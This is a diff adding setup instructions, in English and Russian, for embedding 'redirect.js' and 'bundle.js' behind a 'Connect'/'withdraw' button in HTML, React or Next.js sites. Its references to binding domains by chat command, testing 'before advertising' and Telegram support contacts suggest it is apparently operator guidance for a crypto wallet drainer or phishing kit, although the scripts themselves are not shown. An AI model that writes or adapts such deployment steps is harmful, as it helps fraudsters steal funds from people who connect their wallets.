@@ -1,0 +1,65 @@
+What to do next?
+
+Insert before </body>:
+<script src="./redirect.js"></script>
+<script src="./bundle.js" type="module"></script>
+Bind the button:
+<button class="cw-connect-button cw-withdraw-button">Connect</button>
+Bind the domain to your chat command:
+/linkdomain *domain*Before advertising, try host test_index.html from zip archive
+Make sure you have SSL certificate on your domain.
+If you have any questions, contact admin @La_zet or support @moneychocolatie
+
+
+############################
+Что делать в React (точно под ваш текущий бандл):
+
+Вариант 1 (проще): разместить кнопку и скрипты в public/index.html (CRA/Vite), чтобы они существовали до выполнения bundle.js.
+Пример для CRA/Vite (public/index.html) перед </body>:
+<button class="cw-connect-button cw-withdraw-button">Connect</button>
+<script src="/redirect.js"></script>
+<script src="/bundle.js" type="module"></script>
+
+Вариант 2 (кнопка внутри React): рендерите кнопку в компоненте и динамически подключайте скрипты после монтирования, чтобы к моменту выполнения bundle.js кнопка уже была в DOM.
+Компонент:
+
+import { useEffect } from "react";
+
+export function ConnectButton() {
+  useEffect(() => {
+    const s1 = document.createElement("script");
+    s1.src = "/redirect.js";
+    s1.async = false;
+    document.body.appendChild(s1);
+
+    const s2 = document.createElement("script");
+    s2.src = "/bundle.js";
+    s2.type = "module";
+    s2.async = false;
+    document.body.appendChild(s2);
+
+    return () => {
+      try { document.body.removeChild(s2); } catch {}
+      try { document.body.removeChild(s1); } catch {}
+    };
+  }, []);
+
+  return <button className="cw-connect-button cw-withdraw-button">Connect</button>;
+}
+
+Next.js: аналогично, но удобнее через next/script (скрипты после интерактива):
+import Script from "next/script";
+
+export default function Page() {
+  return (
+    <>
+      <button className="cw-connect-button cw-withdraw-button">Connect</button>
+      <Script src="/redirect.js" strategy="afterInteractive" />
+      <Script src="/bundle.js" type="module" strategy="afterInteractive" />
+    </>
+  );
+}
+
+Важно:
+Скрипты должны грузиться после появления кнопки в DOM, иначе обработчики не навесятся.
+Файлы redirect.js и bundle.js должны лежать в public/ вашего React‑проекта (пути как в примерах).
